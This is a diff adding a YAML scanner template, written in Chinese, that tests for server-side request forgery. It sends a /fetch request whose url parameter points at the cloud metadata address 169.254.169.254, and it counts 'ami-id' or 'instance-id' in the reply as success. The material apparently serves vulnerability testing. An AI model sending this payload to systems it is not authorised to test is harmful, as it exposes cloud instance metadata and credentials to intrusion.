@@ -1,0 +1,24 @@
+name: SSRF服务器端请求伪造测试
+description: 测试SSRF服务器端请求伪造漏洞
+level: 高
+author: Test
+request:
+  method: GET
+  path: /fetch
+  params:
+    url: "http://169.254.169.254/latest/meta-data/"
+    type: "json"
+  headers:
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    Accept: "application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+response:
+  matchType: contains
+  successIndicators:
+    - "ami-id"
+    - "instance-id"
+    - "local-hostname"
+  errorIndicators:
+    - "invalid URL"
+    - "access denied"
+    - "无效URL"
+  statusCode: 200
